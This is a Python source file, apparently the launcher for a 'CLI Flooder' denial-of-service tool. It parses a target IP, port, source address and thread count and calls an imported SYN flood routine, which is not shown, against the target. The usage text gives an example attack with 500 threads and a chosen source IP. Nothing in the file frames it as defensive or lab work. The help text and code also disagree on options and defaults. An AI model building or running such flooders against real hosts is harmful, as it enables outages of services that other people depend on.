import os
import sys

import click
from pyfiglet import Figlet

from IPy import IP
import ipaddress

from constants import SYN_TYPE

from attacks.syn_flood.syn_flood import run_atk


def syn_usage():
    print("SYN FLOOD attack option")
    print("")
    print("Usage: ./main.py run -atk syn")
    print("-t --threads                 - Number of concurrent threads to use [default 50]")
    print("-d --destination             - Ip of destination")
    print("-p --port                    - Port of destination")
    print("-s --source                  - Source ip address")
    print("-c --count					- Number of packets to send")
    print("")
    print("Example: ./syn_flood.py -t 500 -d 10.1.5.2 -p 80 -s 10.1.2.2")
    sys.exit(0)


def syn(destination_ip, port, source_ip, num_thread):
    """
    Runs the SYN attack
    """
    if destination_ip is None or port is None or source_ip is None or num_thread is None:  # Wrong usage
        syn_usage()
        return -1

    run_atk(destination_ip, port, source_ip, num_thread)


@click.group()
def main():
    pass


@main.command(help='Command to specify which attack to perform.')
@click.option('--attack', '-atk', required=True, nargs=1, help='Type of the Flooder attack to be performed.')
@click.option('-d', '--destination',  help='Destination IP Address')
@click.option('-p', '--port', type=int,  help='Destination Port')
@click.option('-s', '--source', help='Source address to send from')
@click.option('-t', '--threads', default=500, help='Number of threads to use')
def run(attack=None, destination=None, port=None, source=None, threads=500):
    if str.lower(attack) == SYN_TYPE:
        syn(destination, port, source, threads)  # Run SYN method

    else:  # Not implemented attack
        print("Option not implemented. Introduced value = {}".format(attack))

    return 0


f = Figlet(font='slant')  # Useless cool text
print(f.renderText('CLI Flooder'))

main()  # Runs the cli
